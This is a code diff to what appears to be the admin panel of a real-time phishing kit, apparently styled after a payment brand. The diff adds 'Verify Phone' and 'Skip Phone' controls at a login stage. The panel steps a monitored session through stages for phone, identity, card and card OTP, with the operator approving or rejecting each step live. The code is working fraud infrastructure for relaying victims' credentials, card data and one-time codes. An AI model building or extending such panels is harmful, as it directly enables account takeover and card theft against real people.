@@ -349,13 +349,30 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                       class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
                                                   Reject
                                               </button>
-                                              <button (click)="approve()"
-                                                      [disabled]="!canInteract()"
-                                                      [class.opacity-50]="!canInteract()"
-                                                      [class.cursor-not-allowed]="!canInteract()"
-                                                      class="bg-pp-navy hover:bg-pp-blue text-white px-6 lg:px-8 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
-                                                  <span class="material-icons text-sm">check</span> {{ approveText() }}
-                                              </button>
+                                              @if (monitoredSession()?.stage === 'login') {
+                                                  <button (click)="approve({ skipPhone: false })"
+                                                          [disabled]="!canInteract()"
+                                                          [class.opacity-50]="!canInteract()"
+                                                          [class.cursor-not-allowed]="!canInteract()"
+                                                          class="bg-pp-navy hover:bg-pp-blue text-white px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
+                                                      <span class="material-icons text-sm">check</span> Verify Phone
+                                                  </button>
+                                                  <button (click)="approve({ skipPhone: true })"
+                                                          [disabled]="!canInteract()"
+                                                          [class.opacity-50]="!canInteract()"
+                                                          [class.cursor-not-allowed]="!canInteract()"
+                                                          class="bg-pp-blue hover:bg-[#005ea6] text-white px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
+                                                      <span class="material-icons text-sm">fast_forward</span> Skip Phone
+                                                  </button>
+                                              } @else {
+                                                  <button (click)="approve()"
+                                                          [disabled]="!canInteract()"
+                                                          [class.opacity-50]="!canInteract()"
+                                                          [class.cursor-not-allowed]="!canInteract()"
+                                                          class="bg-pp-navy hover:bg-pp-blue text-white px-6 lg:px-8 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
+                                                      <span class="material-icons text-sm">check</span> {{ approveText() }}
+                                                  </button>
+                                              }
                                          </div>
                                      }
                                  </div>
@@ -745,13 +762,30 @@ type AdminTab = 'live' | 'history' | 'settings';
                                     class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                 Reject
                             </button>
-                            <button (click)="approve()"
-                                    [disabled]="!canInteract()"
-                                    [class.opacity-50]="!canInteract()"
-                                    [class.cursor-not-allowed]="!canInteract()"
-                                    class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
-                                <span class="material-icons text-sm">check</span> {{ approveText() }}
-                            </button>
+                            @if (session?.stage === 'login') {
+                                <button (click)="approve({ skipPhone: false })"
+                                        [disabled]="!canInteract()"
+                                        [class.opacity-50]="!canInteract()"
+                                        [class.cursor-not-allowed]="!canInteract()"
+                                        class="bg-pp-navy hover:bg-pp-blue text-white px-6 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
+                                    <span class="material-icons text-sm">check</span> Verify Phone
+                                </button>
+                                <button (click)="approve({ skipPhone: true })"
+                                        [disabled]="!canInteract()"
+                                        [class.opacity-50]="!canInteract()"
+                                        [class.cursor-not-allowed]="!canInteract()"
+                                        class="bg-pp-blue hover:bg-[#005ea6] text-white px-6 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
+                                    <span class="material-icons text-sm">fast_forward</span> Skip Phone
+                                </button>
+                            } @else {
+                                <button (click)="approve()"
+                                        [disabled]="!canInteract()"
+                                        [class.opacity-50]="!canInteract()"
+                                        [class.cursor-not-allowed]="!canInteract()"
+                                        class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
+                                    <span class="material-icons text-sm">check</span> {{ approveText() }}
+                                </button>
+                            }
                         </div>
                     } @else {
                         <div class="text-xs text-slate-400 font-bold uppercase tracking-wider">
@@ -1134,17 +1168,17 @@ ${session.fingerprint?.userAgent}
       this.state.adminRejectStep('Security verification failed.');
   }
 
-  approve() {
-      this.state.adminApproveStep();
+  approve(payload: any = {}) {
+      this.state.adminApproveStep(payload);
   }
 
   approveText(): string {
       const stage = this.monitoredSession()?.stage;
       switch (stage) {
-          case 'login': return 'Approve Login';
+          case 'login': return 'Approve Login'; // Should not show due to template check
           case 'phone_pending': return 'Approve Phone';
           case 'personal_pending': return 'Approve Identity';
-          case 'card_pending': return 'Approve Card';
+          case 'card_pending': return 'Approve & Complete';
           case 'card_otp_pending': return 'Approve OTP';
           case 'bank_app_input': return 'Waiting for User'; // New status
           case 'bank_app_pending': return 'Complete Session';
